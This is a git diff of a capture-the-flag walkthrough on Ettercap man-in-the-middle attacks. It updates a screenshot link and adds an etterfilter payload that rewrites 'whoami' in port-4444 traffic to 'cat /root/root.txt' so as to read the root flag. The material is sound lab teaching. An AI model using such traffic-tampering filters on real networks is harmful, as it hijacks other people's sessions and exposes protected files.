@@ -876,11 +876,24 @@ if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
         
     - **Root shell:**
         
-        - ![image](https://user-images.githubusercontent.com/94720207/166812440-785a8105-fd89-4d4e-8474-0e6dd2399ea0.png)
+        - ![image](https://user-images.githubusercontent.com/94720207/166812686-3fcbefb6-c37d-43b8-bebb-036af8e8f67b.png)
 
 - _Hint: In case the reverse shell won't work, try replacing whoami with a suitable cat command to get the flag_
 
+    - Command: `cat /root/root.txt` 
+    - Payload:
 
+```
+
+if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
+    log(DATA.data, "/root/ettercap.log");
+    replace("whoami", "cat /root/root.txt" );
+    msg("###### ETTERFILTER: Fz3r0 substituted a HAPPY COMMAND >'whoami'< with an EVIL CAT MIAU MIAU! >'cat root.txt'<). ######\n");
+}
+
+```
+
+- 
 
 ---
 
